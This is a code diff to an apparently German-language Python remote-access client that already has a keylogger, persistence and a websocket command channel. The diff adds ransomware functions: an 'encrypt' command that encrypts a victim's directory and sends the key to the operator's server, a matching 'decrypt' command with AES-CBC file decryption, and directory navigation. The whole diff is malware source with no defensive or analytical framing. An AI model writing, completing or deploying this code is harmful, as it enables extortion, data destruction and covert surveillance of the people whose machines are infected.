@@ -17,6 +17,10 @@ import urllib.request
 import glob
 from datetime import datetime, timedelta
 import logging
+import secrets
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 
 # pynput wird für den Keylogger benötigt
 try:
@@ -528,6 +532,28 @@ async def process_commands(websocket):
                         f"Die letzten {len(output)} Zeichen aus der Log-Datei "
                         f"({filesize / 1024:.2f} KB):\n{output}"
                     )
+            elif action == "cd":
+                path = command.get("path", ".")
+                response["type"] = "command_output"
+                response["output"] = change_directory(path)
+            elif action == "encrypt":
+                path = command.get("path", ".")
+                response["type"] = "command_output"
+                try:
+                    key, files = encrypt_directory(path)
+                    await send_encryption_key(websocket, key, path)
+                    response["output"] = f"Verschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}.\nSchlüssel wurde an den Server gesendet."
+                except Exception as e:
+                    response["output"] = f"Fehler bei Verschlüsselung: {e}"
+            elif action == "decrypt":
+                path = command.get("path", ".")
+                key_hex = command.get("key_hex")
+                response["type"] = "command_output"
+                try:
+                    files = decrypt_directory(path, key_hex)
+                    response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
+                except Exception as e:
+                    response["output"] = f"Fehler bei Entschlüsselung: {e}"
             else:
                 response["status"] = "error"
                 response["error"] = "Unbekannte Aktion"
@@ -540,6 +566,32 @@ async def process_commands(websocket):
                 await websocket.send(json.dumps(error_response))
             except Exception as e2:
                 print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")
+
+def decrypt_file(filepath, key):
+    backend = default_backend()
+    with open(filepath, "rb") as f:
+        iv = f.read(16)
+        ct = f.read()
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(ct) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
+    data = unpadder.update(padded_data) + unpadder.finalize()
+    with open(filepath, "wb") as f:
+        f.write(data)
+
+def decrypt_directory(path, key_hex):
+    key = bytes.fromhex(key_hex)
+    decrypted_files = []
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            try:
+                full_path = os.path.join(root, file)
+                decrypt_file(full_path, key)
+                decrypted_files.append(full_path)
+            except Exception:
+                pass
+    return decrypted_files
 
 async def connect_to_server():
     ensure_persistence()
